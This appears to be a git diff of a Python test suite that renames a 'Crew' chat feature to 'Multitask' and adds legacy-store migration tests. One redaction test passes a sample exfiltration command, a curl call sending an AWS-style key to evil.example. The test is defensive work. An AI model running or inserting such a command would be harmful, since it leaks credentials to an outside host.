         assert not probed.exists(), "the probe created the store it was asked about"
         assert probed.name.startswith("no-store-here-"), probed.name
@@ -1693,7 +1694,7 @@ class TestGptRoundFive:
         orch = _orch()
         st = orch._store("s1")
         e = st.add_msg("do the thing")
-        real_save = CrewStore._save
+        real_save = MultitaskStore._save
 
         def _fail_topics(self, name, payload):  # type: ignore[no-untyped-def]
             if name == "topics.json":
@@ -1707,7 +1708,7 @@ class TestGptRoundFive:
             return real_save(self, name, payload)
 
         slot = _slot()
-        with patch.object(CrewStore, "_save", _fail_topics):
+        with patch.object(MultitaskStore, "_save", _fail_topics):
             await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"]})
         assert orch._subagents.spawn.called, (
             "an unrelated file's write failure aborted the dispatch"
@@ -1717,8 +1718,8 @@ class TestGptRoundFive:
         await asyncio.gather(*list(st._pending_writes), return_exceptions=True)
         st._pending_writes.clear()
 
-    def test_the_gateway_boot_path_does_not_import_crew(self) -> None:
-        """Crew is dashboard-only, so `--no-dashboard` must not pay for it.
+    def test_the_gateway_boot_path_does_not_import_multitask(self) -> None:
+        """Multitask Mode is dashboard-only, so `--no-dashboard` must not pay for it.
 
         Every module-level `from junction.multitask_chat import ...` this branch added
         sat on the gateway's import graph (gateway -> junction.dashboard ->
@@ -1732,7 +1733,7 @@ class TestGptRoundFive:
             "print(g.__file__);"
             "print('junction.multitask_chat' in sys.modules)"
         )
-        src = Path(crew_mod.__file__).parents[1]
+        src = Path(multitask_mod.__file__).parents[1]
         env = {**os.environ, "PYTHONPATH": str(src)}
         out = subprocess.run(
             [sys.executable, "-c", probe], capture_output=True, text=True, env=env,
@@ -1757,7 +1758,7 @@ class TestGptRoundFive:
         orch = _orch()
         st = orch._store("s1")
         e = st.add_msg("do the thing")
-        real_save = CrewStore._save
+        real_save = MultitaskStore._save
 
         def _fail_queue(self, name, payload):  # type: ignore[no-untyped-def]
             if name == "queue.json":
@@ -1768,7 +1769,7 @@ class TestGptRoundFive:
             return real_save(self, name, payload)
 
         slot = _slot()
-        with patch.object(CrewStore, "_save", _fail_queue):
+        with patch.object(MultitaskStore, "_save", _fail_queue):
             with pytest.raises(OSError):
                 await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"]})
         assert not orch._subagents.spawn.called, "premise: the spawn never happened"
@@ -1788,7 +1789,7 @@ class TestGptRoundFive:
         t["status"] = "running"
         t["active_run_id"] = "r1"
         e = st.add_msg("actually, do it differently")
-        real_save = CrewStore._save
+        real_save = MultitaskStore._save
 
         def _fail_queue(self, name, payload):  # type: ignore[no-untyped-def]
             if name == "queue.json":
@@ -1799,7 +1800,7 @@ class TestGptRoundFive:
             return real_save(self, name, payload)
 
         slot = _slot()
-        with patch.object(CrewStore, "_save", _fail_queue):
+        with patch.object(MultitaskStore, "_save", _fail_queue):
             with pytest.raises(OSError):
                 await orch._apply(slot, st, {
                     "do": "steer", "msg_id": e["msg_id"], "topic_id": "tp1",
@@ -1825,7 +1826,7 @@ class TestGptRoundFive:
         t["status"] = "running"
         e["state"] = "accepted"
         e["run_id"] = "r1"
-        await CrewStore.wait_for(st.save())
+        await MultitaskStore.wait_for(st.save())
 
         full = tmp_path / "result.txt"
         full.write_text(
@@ -1850,7 +1851,7 @@ class TestGptRoundFive:
         preserves case maps `Foo` and `foo` onto ONE directory — two live slots
         sharing a queue, each routing the other's requests. The digest suffix
         keeps them apart on every filesystem."""
-        a, b = CrewStore("Foo"), CrewStore("foo")
+        a, b = MultitaskStore("Foo"), MultitaskStore("foo")
         assert a.dir != b.dir
         # Case-insensitively distinct too, which is the property that matters:
         # equal-ignoring-case names would still collide on such a filesystem.
@@ -1860,13 +1861,13 @@ class TestGptRoundFive:
         # `add_msg` SCHEDULES its write off-loop, so reading a fresh store
         # straight after is a race — it passed locally and lost in CI. Await the
         # writes by name before asserting on what landed.
-        await CrewStore.wait_for(a.save() + b.save())
-        assert [e["text"] for e in CrewStore("Foo").queue] == ["for Foo"]
-        assert [e["text"] for e in CrewStore("foo").queue] == ["for foo"]
+        await MultitaskStore.wait_for(a.save() + b.save())
+        assert [e["text"] for e in MultitaskStore("Foo").queue] == ["for Foo"]
+        assert [e["text"] for e in MultitaskStore("foo").queue] == ["for foo"]
         # The name is a fold + digest and cannot be decoded, so the exact key is
         # recorded for restart reconciliation to read back.
         assert (a.dir / "slot_key").read_text(encoding="utf-8") == "Foo"
-        assert CrewOrchestrator._list_store_dirs() == sorted(["Foo", "foo"])
+        assert MultitaskManager._list_store_dirs() == sorted(["Foo", "foo"])
 
     @pytest.mark.asyncio
     async def test_an_overlong_slot_name_still_gets_a_store(self) -> None:
@@ -1875,15 +1876,15 @@ class TestGptRoundFive:
         raised ENAMETOOLONG — reached from a slot name, so the ingress answered
         500 rather than accepting the request."""
         long_key = "s" * 300
-        st = CrewStore(long_key)
+        st = MultitaskStore(long_key)
         assert len(st.dir.name) <= 255, st.dir.name
         assert st.dir.is_dir(), "an overlong slot name could not be stored at all"
         st.add_msg("survived a very long name")
-        await CrewStore.wait_for(st.save())
-        assert [e["text"] for e in CrewStore(long_key).queue] == ["survived a very long name"]
+        await MultitaskStore.wait_for(st.save())
+        assert [e["text"] for e in MultitaskStore(long_key).queue] == ["survived a very long name"]
         # Truncation must not merge two long keys that share a prefix: the digest
         # is taken over the FULL key, not the surviving remnant.
-        other = CrewStore("s" * 300 + "-different-tail")
+        other = MultitaskStore("s" * 300 + "-different-tail")
         assert other.dir != st.dir
         # The exact key is still recoverable even though the name cannot hold it.
         assert (st.dir / "slot_key").read_text(encoding="utf-8") == long_key
@@ -1893,24 +1894,24 @@ class TestGptRoundFive:
         """Round 20 made an UNREADABLE file fatal but left valid JSON of the
         wrong shape returning [] — the same silent erase one branch over, since
         the next save() writes that emptiness back over the real file."""
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.add_msg("do not lose me")
         # Await the scheduled write before clobbering the file: otherwise it can
         # land AFTER the overwrite and restore a valid list, and the test passes
         # for the wrong reason.
-        await CrewStore.wait_for(st.save())
+        await MultitaskStore.wait_for(st.save())
         (st.dir / "queue.json").write_text('{"queue": []}', encoding="utf-8")
         with pytest.raises(RuntimeError, match="not a JSON list"):
-            CrewStore("s1")
+            MultitaskStore("s1")
         # The refusal is the point: the bytes are still there to salvage.
         assert (st.dir / "queue.json").read_text(encoding="utf-8") == '{"queue": []}'
 
     @pytest.mark.asyncio
     async def test_dispatch_runs_in_the_slots_own_project(self) -> None:
-        """A crew subagent EDITS FILES, so the project it launches in is not
+        """A topic subagent EDITS FILES, so the project it launches in is not
         cosmetic. The slot's field is `project`; reading `cwd` (which no chat slot
-        has) answered "" every time, so every crew subagent ran in the POOL
-        project and relative edits landed in someone else's tree."""
+        has) answers "" every time, so every topic subagent would run in the POOL
+        project and relative edits would land in someone else's tree."""
         subagents = MagicMock()
         seen: list[str] = []
         subagents.spawn = MagicMock(
@@ -1933,7 +1934,7 @@ class TestGptRoundFive:
 
     @pytest.mark.asyncio
     async def test_an_app_owned_session_is_refused_with_a_code(self) -> None:
-        """Crew declines app-owned sessions. Returning nothing let `api_chat`
+        """The manager declines app-owned sessions. Returning nothing let `api_chat`
         answer 200, so a programmatic caller was told its message was accepted
         for work that would never run — the transcript note it posts is not
         visible to an API caller."""
@@ -1943,7 +1944,7 @@ class TestGptRoundFive:
         with patch.object(orch, "_post") as post, \
              patch.object(orch, "_decide", new=AsyncMock()) as decide:
             refusal = await orch.ingest(slot, "do thing A")
-        assert refusal == "crew_app_session_unsupported"
+        assert refusal == "multitask_app_session_unsupported"
         assert post.called, "the user was not told either"
         assert decide.await_count + decide.call_count == 0
         # An accepted message still reports acceptance as None.
@@ -1952,8 +1953,8 @@ class TestGptRoundFive:
             assert await orch.ingest(_slot(), "do thing B") is None
 
     @pytest.mark.asyncio
-    async def test_crew_chat_does_not_import_the_dashboard_handler_tree(self) -> None:
-        """Crew's module is imported at module scope by `slack.gateway`, so what
+    async def test_multitask_chat_does_not_import_the_dashboard_handler_tree(self) -> None:
+        """The multitask module is imported at module scope by `slack.gateway`, so what
         `multitask_chat` imports, a Slack-only gateway pays for before it binds.
         `handlers/__init__` eagerly loads the WHOLE handler tree, so reaching the
         spawn warm helper through `handlers.messaging` put that tree on the
@@ -1973,7 +1974,7 @@ class TestGptRoundFive:
         # Resolve the tree UNDER TEST, not whatever `junction` the interpreter
         # would find on its own — a subprocess inherits no path from pytest, and
         # an installed copy would silently answer for a different revision.
-        src_root = str(Path(crew_mod.__file__).resolve().parents[1])
+        src_root = str(Path(multitask_mod.__file__).resolve().parents[1])
         env = {**os.environ, "PYTHONPATH": src_root}
         r = subprocess.run([sys.executable, "-c", prog], capture_output=True,
                            text=True, env=env)
@@ -1982,33 +1983,33 @@ class TestGptRoundFive:
         assert leaked == [], f"multitask_chat pulled the handler tree: {leaked}"
 
     @pytest.mark.asyncio
-    async def test_a_dots_only_slot_is_refused_at_the_crew_entry_points(self) -> None:
-        """`CrewStore` refuses a dots-only key, and that refusal is the LAST
+    async def test_a_dots_only_slot_is_refused_at_the_multitask_entry_points(self) -> None:
+        """`MultitaskStore` refuses a dots-only key, and that refusal is the LAST
         line — reached only once the tab exists and the user has typed, i.e. an
         unhandled 500 on every message it ever sends. The entry points answer
         first."""
-        from junction.multitask_chat import is_crew_capable_slot_key
+        from junction.multitask_chat import is_multitask_capable_slot_key
 
         for bad in (".", "..", "...", ""):
-            assert not is_crew_capable_slot_key(bad), bad
-            with pytest.raises(ValueError, match="unsafe crew slot key"):
-                CrewStore(bad)
+            assert not is_multitask_capable_slot_key(bad), bad
+            with pytest.raises(ValueError, match="unsafe multitask slot key"):
+                MultitaskStore(bad)
         # A TRAILING dot is the collision the dots-only rule misses: Win32 strips
         # it, so `foo.` and `foo` are ONE directory there and two slots would
         # share a queue, each routing the other's requests. Reserved DEVICE names
         # cannot be created at all.
         for bad in ("foo.", "a.b.", "CON", "con", "nul", "COM1", "LPT9",
                     "CON.txt"):
-            assert not is_crew_capable_slot_key(bad), bad
-            with pytest.raises(ValueError, match="unsafe crew slot key"):
-                CrewStore(bad)
+            assert not is_multitask_capable_slot_key(bad), bad
+            with pytest.raises(ValueError, match="unsafe multitask slot key"):
+                MultitaskStore(bad)
         # Names that merely CONTAIN dots — or fold to a legal directory name at
         # all, like "/" -> "_" and "foo " -> "foo_" — are ordinary and must keep
         # working. `console` only STARTS with a reserved name, it is not one.
         for ok in ("a.b", "..a", "s1", "_._", "/", "foo ", "console",
                    "confidential", "CONS", "comport"):
-            assert is_crew_capable_slot_key(ok), ok
-            CrewStore(ok)
+            assert is_multitask_capable_slot_key(ok), ok
+            MultitaskStore(ok)
 
     @pytest.mark.asyncio
     async def test_straggler_failure_notice_waits_for_its_queue_write(self) -> None:
@@ -2020,15 +2021,15 @@ class TestGptRoundFive:
         slot = _slot()
         st = orch._store("s1")
         st.add_msg("route me")
-        orch._decide_attempts["s1"] = crew_mod._DECIDE_MAX_ATTEMPTS - 1
+        orch._decide_attempts["s1"] = multitask_mod._DECIDE_MAX_ATTEMPTS - 1
         order: list[str] = []
-        real_wait = CrewStore.wait_for
+        real_wait = MultitaskStore.wait_for
 
         async def _wait(futures):  # type: ignore[no-untyped-def]
             order.append("write")
             return await real_wait(futures)
 
-        with patch.object(CrewStore, "wait_for", staticmethod(_wait)), \
+        with patch.object(MultitaskStore, "wait_for", staticmethod(_wait)), \
              patch.object(orch, "_post",
                           side_effect=lambda *a, **k: order.append("post") or True):
             assert await orch._settle_stragglers(slot) is False
@@ -2073,8 +2074,8 @@ class TestGptRoundFive:
         st = orch._store("s1")
         e = st.add_msg("actually use TypeScript")
         e["state"] = "steering"
-        await CrewStore.wait_for(st.save())
-        fresh = CrewStore("s1")
+        await MultitaskStore.wait_for(st.save())
+        fresh = MultitaskStore("s1")
         orch._reconcile("s1", fresh)
         entry = fresh.entry(e["msg_id"]) or {}
         assert entry.get("state") == "stopped", "an interrupted steer was replayed"
@@ -2211,7 +2212,7 @@ class TestLiveRunIsReOwned:
     """The one case where re-owning is right: the run really is still executing."""
 
     def test_a_live_run_is_adopted_and_not_settled(self) -> None:
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         e = st.add_msg("still going")
         e["state"] = "accepted"
         e["dispatch_id"] = "alive001"
@@ -2222,7 +2223,7 @@ class TestLiveRunIsReOwned:
         orch._reconcile("s1", st)
         assert st.entry(e["msg_id"])["state"] == "accepted"
         assert orch._owned.get("alive001") == "s1"
-        assert not CrewStore("s1").forwards, "a live run must not be reported interrupted"
+        assert not MultitaskStore("s1").forwards, "a live run must not be reported interrupted"
 
 
 class TestTopicCap:
@@ -2230,19 +2231,19 @@ class TestTopicCap:
     stay bounded — an unbounded file puts a growing parse on the event loop."""
 
     def test_idle_topics_are_pruned_oldest_first(self) -> None:
-        st = CrewStore("s1")
-        for i in range(crew_mod._TOPIC_IDLE_CAP + 25):
+        st = MultitaskStore("s1")
+        for i in range(multitask_mod._TOPIC_IDLE_CAP + 25):
             t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
             t["status"] = "idle"
             t["last_activity"] = float(i)          # ascending: t0 is the oldest
         st.save()
-        kept = {t["topic_id"] for t in CrewStore("s1").topics}
-        assert len(kept) == crew_mod._TOPIC_IDLE_CAP
+        kept = {t["topic_id"] for t in MultitaskStore("s1").topics}
+        assert len(kept) == multitask_mod._TOPIC_IDLE_CAP
         assert "t0" not in kept and "t24" not in kept          # oldest dropped
-        assert f"t{crew_mod._TOPIC_IDLE_CAP + 24}" in kept     # newest kept
+        assert f"t{multitask_mod._TOPIC_IDLE_CAP + 24}" in kept     # newest kept
 
     def test_running_and_held_topics_are_never_pruned(self) -> None:
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         old_running = st.add_topic("keep-running", "r1", "still working", "m1")
         old_running["status"] = "running"
         old_running["last_activity"] = 0.0                     # the oldest of all
@@ -2250,12 +2251,12 @@ class TestTopicCap:
         old_held["status"] = "idle"
         old_held["held"] = ["m9"]
         old_held["last_activity"] = 0.0
-        for i in range(crew_mod._TOPIC_IDLE_CAP + 10):
+        for i in range(multitask_mod._TOPIC_IDLE_CAP + 10):
             t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
             t["status"] = "idle"
             t["last_activity"] = float(i + 1)
         st.save()
-        kept = {t["topic_id"] for t in CrewStore("s1").topics}
+        kept = {t["topic_id"] for t in MultitaskStore("s1").topics}
         assert "keep-running" in kept, "a running topic was pruned"
         assert "keep-held" in kept, "a topic still holding queued messages was pruned"
 
@@ -2269,19 +2270,19 @@ class TestTopicCap:
         when it arrives. Every non-terminal state pins, for the same reason.
         """
         for pinning_state in ("claimed", "pending", "ask", "accepted"):
-            st = CrewStore(f"pin-{pinning_state}")
+            st = MultitaskStore(f"pin-{pinning_state}")
             claimed = st.add_topic("keep-claimed", "r1", "dispatch in flight", "m1")
             claimed["status"] = "idle"                          # not yet running
             claimed["last_activity"] = 0.0                      # the oldest of all
             e = st.add_msg("the in-flight request")
             e["state"] = pinning_state
             e["topic_id"] = "keep-claimed"
-            for i in range(crew_mod._TOPIC_IDLE_CAP + 10):
+            for i in range(multitask_mod._TOPIC_IDLE_CAP + 10):
                 t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
                 t["status"] = "idle"
                 t["last_activity"] = float(i + 1)
             st.save()
-            kept = {t["topic_id"] for t in CrewStore(f"pin-{pinning_state}").topics}
+            kept = {t["topic_id"] for t in MultitaskStore(f"pin-{pinning_state}").topics}
             assert "keep-claimed" in kept, (
                 f"a topic referenced by a {pinning_state} entry was pruned; "
                 "its result would arrive with nowhere to land"
@@ -2291,21 +2292,21 @@ class TestTopicCap:
         """The pin must not defeat the cap: a finished entry keeps its topic_id
         forever, so if terminal states pinned too, topics.json would grow without
         bound and put an ever-larger inline parse back on the event loop."""
-        st = CrewStore("no-pin")
+        st = MultitaskStore("no-pin")
         done = st.add_topic("prunable", "r1", "long finished", "m1")
         done["status"] = "idle"
         done["last_activity"] = 0.0
         e = st.add_msg("finished request")
         e["state"] = "done"
         e["topic_id"] = "prunable"
-        for i in range(crew_mod._TOPIC_IDLE_CAP + 10):
+        for i in range(multitask_mod._TOPIC_IDLE_CAP + 10):
             t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
             t["status"] = "idle"
             t["last_activity"] = float(i + 1)
         st.save()
-        kept = {t["topic_id"] for t in CrewStore("no-pin").topics}
+        kept = {t["topic_id"] for t in MultitaskStore("no-pin").topics}
         assert "prunable" not in kept
-        assert len(kept) == crew_mod._TOPIC_IDLE_CAP
+        assert len(kept) == multitask_mod._TOPIC_IDLE_CAP
 
 
 class TestContinuationIdentity:
@@ -2341,7 +2342,7 @@ class TestDurableRunEvidence:
         # An `accepted` entry whose run has no durable record never actually
         # started (the process died with the capacity queue), so it must be
         # reopened rather than left accepted forever.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         e = st.add_msg("do the thing")
         e["state"] = "accepted"
         e["dispatch_id"] = "gone1234"
@@ -2350,7 +2351,7 @@ class TestDurableRunEvidence:
         # A restart leaves the in-process registry empty — that emptiness is
         # exactly what must NOT be read as evidence either way.
         orch._subagents.get = MagicMock(return_value=None)
-        with patch.object(crew_mod, "read_state", return_value=None):
+        with patch.object(multitask_mod, "read_state", return_value=None):
             orch._reconcile("s1", st)
         assert st.entry(e["msg_id"])["state"] == "pending"
 
@@ -2359,7 +2360,7 @@ class TestDurableRunEvidence:
         # old volatile check concluded "never ran" and reopened the entry —
         # re-executing a task that had in fact started. Durable state knows
         # better, and is the only thing that can distinguish the two.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         e = st.add_msg("mutating task")
         e["state"] = "claimed"
         e["dispatch_id"] = "started1"
@@ -2367,18 +2368,18 @@ class TestDurableRunEvidence:
         orch = _orch()
         orch._subagents.get = MagicMock(return_value=None)      # restart: empty
         orch._state.get_slot = MagicMock(return_value=None)
-        with patch.object(crew_mod, "read_state", return_value={"id": "started1"}):
+        with patch.object(multitask_mod, "read_state", return_value={"id": "started1"}):
             orch._reconcile("s1", st)
         # NOT reopened: reopening would run the mutating task a second time.
         assert st.entry(e["msg_id"])["state"] != "pending"
         # And the user is told, rather than the task vanishing silently.
-        assert any("interrupted" in f["body"] for f in CrewStore("s1").forwards)
+        assert any("interrupted" in f["body"] for f in MultitaskStore("s1").forwards)
 
     def test_a_failed_durable_lookup_fails_closed(self) -> None:
         # If the durable lookup itself errors we cannot prove the run never
         # started, so the safe answer is "assume it did" — never re-execute on an
         # unknown answer.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         e = st.add_msg("mutating task")
         e["state"] = "claimed"
         e["dispatch_id"] = "unknown1"
@@ -2386,14 +2387,14 @@ class TestDurableRunEvidence:
         orch = _orch()
         orch._subagents.get = MagicMock(return_value=None)
         orch._state.get_slot = MagicMock(return_value=None)
-        with patch.object(crew_mod, "read_state", side_effect=OSError("disk gone")):
+        with patch.object(multitask_mod, "read_state", side_effect=OSError("disk gone")):
             orch._reconcile("s1", st)
         assert st.entry(e["msg_id"])["state"] != "pending"
 
     def test_durably_recorded_run_is_not_re_dispatched(self) -> None:
         # Same shape, but state.json exists: the run DID start, so re-opening it
         # would re-execute a possibly-mutating task.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         e = st.add_msg("do the thing")
         e["state"] = "claimed"
         e["dispatch_id"] = "live1234"
@@ -2403,7 +2404,7 @@ class TestDurableRunEvidence:
         # exactly what must NOT be read as evidence either way.
         orch._subagents.get = MagicMock(return_value=None)
         orch._state.get_slot = MagicMock(return_value=None)   # tab not reopened yet
-        with patch.object(crew_mod, "read_state", return_value={"id": "live1234"}):
+        with patch.object(multitask_mod, "read_state", return_value={"id": "live1234"}):
             orch._reconcile("s1", st)
         # Started but no longer running: settled, NOT reopened (never re-execute)
         # and NOT left accepted forever (no completion is coming).
@@ -2415,7 +2416,7 @@ class TestDurableRunEvidence:
 
 class TestReconcile:
     def test_interrupted_dispatch_reopens(self) -> None:
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         e = st.add_msg("m")
         e["state"] = "claimed"
         t = st.add_topic("t1", "r_dead", "topic", e["msg_id"])
@@ -2429,7 +2430,7 @@ class TestReconcile:
         assert st2.topic("t1")["status"] == "idle"
 
     def test_live_run_reowned(self) -> None:
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         t = st.add_topic("t1", "r_live", "topic", "m0")
         t["status"] = "running"
         st.save()
@@ -2441,14 +2442,84 @@ class TestReconcile:
         assert orch.owns("r_live")
 
 
+# ── legacy store root ──
+
+
+def _write_legacy_store(root: Path, slot_key: str, text: str) -> None:
+    """A store as an earlier build left it under the legacy root."""
+    d = root / multitask_mod._store_name(slot_key)
+    d.mkdir(parents=True)
+    (d / "slot_key").write_text(slot_key, encoding="utf-8")
+    entry = {"msg_id": "m1", "text": text, "state": "pending", "ts": 1.0}
+    (d / "queue.json").write_text(json.dumps([entry]), encoding="utf-8")
+
+
+class TestLegacyStoreRootMigration:
+    """Earlier builds kept the stores under the legacy root. A manager that only
+    scans the current root would strand every queued request and undelivered
+    forward an upgrade finds there, so the root is moved once, at init."""
+
+    def test_the_manager_moves_the_legacy_root_before_resuming(self, tmp_path: Path) -> None:
+        legacy = tmp_path / multitask_mod.LEGACY_STORE_ROOT_NAME
+        _write_legacy_store(legacy, "chat-1", "queued before the upgrade")
+
+        _orch()
+
+        assert not legacy.exists()
+        assert MultitaskManager._list_store_dirs() == ["chat-1"]
+        assert [e["text"] for e in MultitaskStore("chat-1").queue] == [
+            "queued before the upgrade"
+        ]
+
+    def test_the_move_is_idempotent(self, tmp_path: Path) -> None:
+        _write_legacy_store(
+            tmp_path / multitask_mod.LEGACY_STORE_ROOT_NAME, "chat-1", "once"
+        )
+
+        assert multitask_mod.migrate_legacy_store_root() is True
+        assert multitask_mod.migrate_legacy_store_root() is False
+        assert MultitaskManager._list_store_dirs() == ["chat-1"]
+
+    def test_an_existing_current_root_is_never_overwritten(self, tmp_path: Path) -> None:
+        legacy = tmp_path / multitask_mod.LEGACY_STORE_ROOT_NAME
+        _write_legacy_store(legacy, "old-slot", "left by the earlier build")
+        MultitaskStore("new-slot")  # creates the current root
+
+        assert multitask_mod.migrate_legacy_store_root() is False
+
+        assert legacy.is_dir(), "the legacy stores must not be deleted"
+        assert MultitaskManager._list_store_dirs() == ["new-slot"]
+
+    def test_no_legacy_root_is_a_no_op(self, tmp_path: Path) -> None:
+        assert multitask_mod.migrate_legacy_store_root() is False
+        assert not (tmp_path / "multitask").exists()
+
+
 # ── mode plumbing ──
 
 
 class TestModePlumbing:
-    def test_valid_modes_include_crew(self) -> None:
+    def test_valid_modes_include_multitask(self) -> None:
         from junction.dashboard.chat_folders import _VALID_MODES
 
-        assert "crew" in _VALID_MODES
+        assert "multitask" in _VALID_MODES
+
+    def test_the_legacy_slot_mode_reads_as_multitask(self) -> None:
+        """A transcript an earlier build wrote carries the legacy mode spelling;
+        the tab it restores must come back in multitask mode or its queue is
+        orphaned. The legacy spelling is a READ alias only: no client switches a
+        slot to it."""
+        from junction.dashboard.chat_folders import (
+            _VALID_MODES,
+            LEGACY_SLOT_MODE_MULTITASK,
+            SLOT_MODE_MULTITASK,
+            normalize_slot_mode,
+        )
+
+        assert normalize_slot_mode(LEGACY_SLOT_MODE_MULTITASK) == SLOT_MODE_MULTITASK
+        assert LEGACY_SLOT_MODE_MULTITASK not in _VALID_MODES
+        for mode in ("", "orchestrator", SLOT_MODE_MULTITASK, "design-critique"):
+            assert normalize_slot_mode(mode) == mode
 
 
 # ── adversarial-review regression fixes ──
@@ -2461,9 +2532,9 @@ class TestReviewFixes:
         # B1: _post is the sole delivery chokepoint and must redact.
         orch = _orch()
         slot = _slot()
-        with patch.object(crew_mod, "redact_exfiltration_urls",
+        with patch.object(multitask_mod, "redact_exfiltration_urls",
                           return_value=("[URL-REDACTED]", ["w"])) as r_url, \
-             patch.object(crew_mod, "redact_credentials",
+             patch.object(multitask_mod, "redact_credentials",
                           return_value=("[CRED-REDACTED]", ["w"])) as r_cred:
             orch._post(slot, "curl https://evil.example/?d=AKIA123")
         r_url.assert_called_once()
@@ -2474,7 +2545,7 @@ class TestReviewFixes:
         # B1 companion: never post raw content if redaction itself breaks.
         orch = _orch()
         slot = _slot()
-        with patch.object(crew_mod, "redact_exfiltration_urls",
+        with patch.object(multitask_mod, "redact_exfiltration_urls",
                           side_effect=RuntimeError("boom")):
             orch._post(slot, "secret")
         slot.append.assert_not_called()
@@ -2538,7 +2609,7 @@ class TestReviewFixes:
         # B2 (Opus) companion: restart must reopen held entries (their
         # dispatching completion may never arrive) and clear topic held
         # lists so nothing double-dispatches later.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         e = st.add_msg("stuck")
         t = st.add_topic("t1", "r-dead", "topic", "m0")
         e["state"] = "held"
@@ -2556,14 +2627,14 @@ class TestReviewFixes:
     def test_save_prunes_old_terminal_entries(self) -> None:
         # R2: queue.json must stay bounded — terminal entries beyond the cap
         # are pruned oldest-first; live entries are never pruned.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         live = st.add_msg("still pending")
-        for i in range(crew_mod._QUEUE_TERMINAL_CAP + 50):
+        for i in range(multitask_mod._QUEUE_TERMINAL_CAP + 50):
             e = st.add_msg(f"old {i}")
             e["state"] = "done"
         st.save()
         terminal = [e for e in st.queue if e["state"] == "done"]
-        assert len(terminal) == crew_mod._QUEUE_TERMINAL_CAP
+        assert len(terminal) == multitask_mod._QUEUE_TERMINAL_CAP
         assert terminal[0]["text"] == "old 50"  # oldest 50 dropped
         assert st.entry(live["msg_id"]) is not None
 
@@ -2577,11 +2648,11 @@ class TestReviewFixes:
         seen: list[list[str]] = []
         on_disk: list[list[str]] = []
 
-        def _spy(_slot, _content, kind="crew"):
+        def _spy(_slot, _content, kind="multitask"):
             seen.append([f["body"] for f in orch._store("s1").forwards])
             # Read the persisted copy straight off disk: this is what survives a
             # crash, and the whole point of awaiting the write before posting.
-            fresh = CrewStore("s1")
+            fresh = MultitaskStore("s1")
             on_disk.append([f["body"] for f in fresh.forwards])
             return True          # `_post` reports delivery; this one succeeded
 
@@ -2598,7 +2669,7 @@ class TestReviewFixes:
     @pytest.mark.asyncio
     async def test_reconcile_redelivers_orphaned_forwards(self) -> None:
         # Crash between persist and post: reconcile re-delivers on restart.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.add_forward("orphaned result")
         await st.wait_writes()  # durable before the "restarted" store reads disk
         state = MagicMock()
@@ -2614,41 +2685,41 @@ class TestReviewFixes:
             for _ in range(200):
                 await asyncio.sleep(0.01)
                 try:
-                    if not CrewStore("s1").forwards:
+                    if not MultitaskStore("s1").forwards:
                         break
                 except (RuntimeError, OSError):
                     pass  # file locked by drain task — retry
         post.assert_called_once()
         assert "orphaned result" in post.call_args.args[1]
-        assert CrewStore("s1").forwards == []
+        assert MultitaskStore("s1").forwards == []
 
 
 # ── gateway wiring (GPT review finding on faf5a127) ──
 
 
-class TestGatewayCrewInit:
-    """_init_crew must attach AFTER dashboard init — calling it while
-    dashboard_state is None silently disabled crew mode on every real boot."""
+class TestGatewayMultitaskInit:
+    """_init_multitask must attach AFTER dashboard init — calling it while
+    dashboard_state is None silently disabled multitask mode on every real boot."""
 
-    def test_init_crew_attaches_when_dashboard_ready(self) -> None:
+    def test_init_multitask_attaches_when_dashboard_ready(self) -> None:
         from junction.slack.gateway import GatewayOrchestrator
 
         g = MagicMock()
         g.dashboard_state = MagicMock()
-        g.dashboard_state.crew = None
-        GatewayOrchestrator._init_crew(g)
-        assert g.dashboard_state.crew is not None
-        assert isinstance(g.dashboard_state.crew, CrewOrchestrator)
+        g.dashboard_state.multitask = None
+        GatewayOrchestrator._init_multitask(g)
+        assert g.dashboard_state.multitask is not None
+        assert isinstance(g.dashboard_state.multitask, MultitaskManager)
 
-    def test_init_crew_noop_without_dashboard(self) -> None:
+    def test_init_multitask_noop_without_dashboard(self) -> None:
         from junction.slack.gateway import GatewayOrchestrator
 
         g = MagicMock()
         g.dashboard_state = None
-        GatewayOrchestrator._init_crew(g)  # must not raise
+        GatewayOrchestrator._init_multitask(g)  # must not raise
 
-    def test_startup_sequence_orders_crew_after_dashboard(self) -> None:
-        # Static guard: in the gateway start sequence, _init_crew() must be
+    def test_startup_sequence_orders_multitask_after_dashboard(self) -> None:
+        # Static guard: in the gateway start sequence, _init_multitask() must be
         # invoked after _init_dashboard() (the original defect called the
         # attach logic from _init_subagents, which runs earlier).
         import inspect
@@ -2657,12 +2728,12 @@ class TestGatewayCrewInit:
 
         src = inspect.getsource(gw)
         dash = src.index("await self._init_dashboard()")
-        crew = src.index("self._init_crew()")
-        assert crew > dash
+        multitask = src.index("self._init_multitask()")
+        assert multitask > dash
 
     @pytest.mark.asyncio
     async def test_completion_settles_store_when_slot_closed(self) -> None:
-        # GPT finding on 7d6f4d7a: closing a crew slot mid-run must not leave
+        # GPT finding on 7d6f4d7a: closing a multitask slot mid-run must not leave
         # the topic wedged in "running" — settle + persist before slot check.
         state = MagicMock()
         state.get_slot = MagicMock(return_value=None)  # slot closed
@@ -2677,7 +2748,7 @@ class TestGatewayCrewInit:
         assert t["status"] == "idle"          # settled, not wedged
         assert e["state"] == "done"
         await st.wait_writes()
-        assert CrewStore("s1").topic("t1")["digest"] == "all done"  # persisted
+        assert MultitaskStore("s1").topic("t1")["digest"] == "all done"  # persisted
 
     @pytest.mark.asyncio
     async def test_stopped_run_not_recorded_as_done(self) -> None:
@@ -2704,7 +2775,7 @@ class TestGatewayCrewInit:
         # GPT finding on 76d35e37: store writes must not block the event loop.
